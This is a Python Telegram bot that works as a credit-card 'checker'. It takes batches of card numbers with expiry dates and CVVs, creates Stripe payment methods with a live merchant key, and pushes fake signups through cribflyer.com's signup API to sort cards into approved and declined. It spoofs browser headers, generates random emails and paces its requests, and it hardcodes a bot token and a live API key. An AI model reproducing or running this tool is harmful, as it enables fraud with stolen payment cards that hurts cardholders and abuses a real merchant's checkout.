import re
import time
import random
import string
import threading
import requests
import telebot
import uuid
import json

BOT_TOKEN = '7634693376:AAGzz0nE7BfOR2XE7gyWGB6s4ycAL8pOUqY'
bot = telebot.TeleBot(BOT_TOKEN)

user_stop_flag = {}

def random_email():
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    return f"{username}@gmail.com"

def parse_cards(text):
    cards = []
    lines = text.replace('/', '|').splitlines()
    for line in lines:
        parts = [p.strip().replace(' ', '') for p in line.split('|')]
        if len(parts) == 4:
            cc, mm, yy, cvv = parts
            if len(yy) == 2:
                yy = '20' + yy
            if all(p.isdigit() for p in [cc, mm, yy, cvv]):
                cards.append((cc, mm, yy, cvv))
    return cards

@bot.message_handler(commands=['start'])
def start_handler(message):
    bot.send_message(
        message.chat.id,
        "👋 Welcome! Send credit cards in one of these formats (one per line):\n"
        "`CC|MM|YY|CVV`\n"
        "`CC|MM|YYYY|CVV`\n"
        "`CC/MM/YY/CVV`\n"
        "`CC/MM/YYYY/CVV`\n\n"
        "Send /stop anytime to cancel checking.",
        parse_mode="Markdown"
    )

@bot.message_handler(commands=['stop'])
def stop_handler(message):
    user_stop_flag[message.from_user.id] = True
    bot.send_message(message.chat.id, "⏹️ Checking stopped.")

def generate_uuid_with_suffix(suffix_length=6):
    return f"{uuid.uuid4()}{''.join(random.choices(string.hexdigits.lower(), k=suffix_length))}"

def check_card_flow(message, cards):
    user_id = message.from_user.id
    chat_id = message.chat.id
    user_stop_flag[user_id] = False
    
    for idx, (cc, mm, yy, cvv) in enumerate(cards, 1):
        if user_stop_flag.get(user_id):
            bot.send_message(chat_id, "⏹️ Checking stopped by user.")
            break

        guid = generate_uuid_with_suffix(8)
        muid = generate_uuid_with_suffix(6)
        sid = generate_uuid_with_suffix(6)

        email = random_email()
        name = "John Doe"
        firstname = "John"
        lastname = "Doe"
        password = "War112233$%"

        stripe_payload = {
            "billing_details[name]": name,
            "billing_details[email]": email,
            "type": "card",
            "card[number]": cc,
            "card[cvc]": cvv,
            "card[exp_year]": yy[-2:],  # Stripe expects 2-digit year
            "card[exp_month]": mm,
            "allow_redisplay": "unspecified",
            "pasted_fields": "number",
            "payment_user_agent": "stripe.js/9e39ef88d1; stripe-js-v3/9e39ef88d1; payment-element; deferred-intent",
            "referrer": "https://www.cribflyer.com",
            "time_on_page": str(random.randint(10000, 99999)),
            "client_attribution_metadata[client_session_id]": str(uuid.uuid4()),
            "client_attribution_metadata[merchant_integration_source]": "elements",
            "client_attribution_metadata[merchant_integration_subtype]": "payment-element",
            "client_attribution_metadata[merchant_integration_version]": "2021",
            "client_attribution_metadata[payment_intent_creation_flow]": "deferred",
            "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
            "guid": guid,
            "muid": muid,
            "sid": sid,
            "key": "pk_live_QzBMW6gThdrTmOZ1k4lPJtSU",
        }

        try:
            stripe_resp = requests.post(
                "https://api.stripe.com/v1/payment_methods",
                data=stripe_payload,
                headers={
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
                },
                timeout=30
            )
            stripe_json = stripe_resp.json()
        except Exception as e:
            bot.send_message(chat_id, f"❌ Stripe Error: {str(e)}")
            continue

        if 'id' not in stripe_json or not stripe_json['id'].startswith('pm_'):
            bot.send_message(chat_id, f"❌ Stripe Error: {stripe_json.get('error', {}).get('message', 'Unknown error')}")
            continue

        crib_headers = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
            "Origin": "https://www.cribflyer.com",
            "Referer": "https://www.cribflyer.com/signup?p=property_plan&qty=1",
            "X-Requested-With": "XMLHttpRequest",
            "Cookie": f"__stripe_mid={muid}; __stripe_sid={sid}; cfid=f0999602-b357-441d-bce3-5e8d6861c302; cftoken=0;"
        }

        crib_payload = {
            "email": email,
            "name": name,
            "firstname": firstname,
            "lastname": lastname,
            "password": password,
            "confpassword": password,
            "product": "property_plan",
            "qty": "1",
            "pmid": stripe_json['id']
        }

        # Retry logic for Cribflyer API with JSON decode and empty response handling
        max_retries = 3
        crib_data = {"ERROR": True}  # Default in case of failure
        for attempt in range(max_retries):
            try:
                crib_resp = requests.post(
                    "https://www.cribflyer.com/signup/api",
                    data=crib_payload,
                    headers=crib_headers,
                    timeout=30
                )
                if not crib_resp.text.strip():
                    raise ValueError("Empty response from server")

                crib_data = crib_resp.json()
                break  # Success, exit retry loop

            except (json.JSONDecodeError, ValueError) as e:
                if attempt < max_retries - 1:
                    time.sleep(1)
                    continue
                bot.send_message(
                    chat_id,
                    f"❌ Cribflyer Error: Failed to decode response after {max_retries} attempts\n"
                    f"Raw response: {crib_resp.text[:200] if crib_resp.text else 'No content'}"
                )
                crib_data = {"ERROR": True, "message": str(e)}
                break
            except Exception as e:
                bot.send_message(chat_id, f"❌ Cribflyer Error: {str(e)}")
                crib_data = {"ERROR": True, "message": str(e)}
                break

        status = "✅ Approved" if crib_data.get("ERROR") is False else "❌ Declined"
        response_text = (
            f"Card {idx}/{len(cards)}: {cc}|{mm}|{yy}|{cvv}\n"
            f"Status: {status}"
        )
        if "message" in crib_data:
            response_text += f"\nDetails: <code>{crib_data['message']}</code>"

        bot.send_message(chat_id, response_text, parse_mode="HTML")

        if idx < len(cards):
            for i in range(15, 0, -1):
                if user_stop_flag.get(user_id):
                    bot.send_message(chat_id, "⏹️ Checking stopped by user.")
                    return
                bot.send_chat_action(chat_id, 'typing')
                time.sleep(1)

@bot.message_handler(func=lambda m: True)
def card_handler(message):
    if message.text and message.text.strip().startswith('/') and message.text.lower() not in ['/start', '/stop']:
        return

    cards = parse_cards(message.text)
    if not cards:
        bot.send_message(
            message.chat.id,
            "❌ Format not recognized. Please send cards as:\n"
            "`CC|MM|YY|CVV`\n"
            "`CC|MM|YYYY|CVV`\n"
            "`CC/MM/YY/CVV`\n"
            "`CC/MM/YYYY/CVV`",
            parse_mode="Markdown"
        )
        return

    bot.send_message(message.chat.id, f"🔍 Checking {len(cards)} card(s)... (send /stop to cancel)")
    threading.Thread(target=check_card_flow, args=(message, cards)).start()

if __name__ == '__main__':
    bot.infinity_polling()
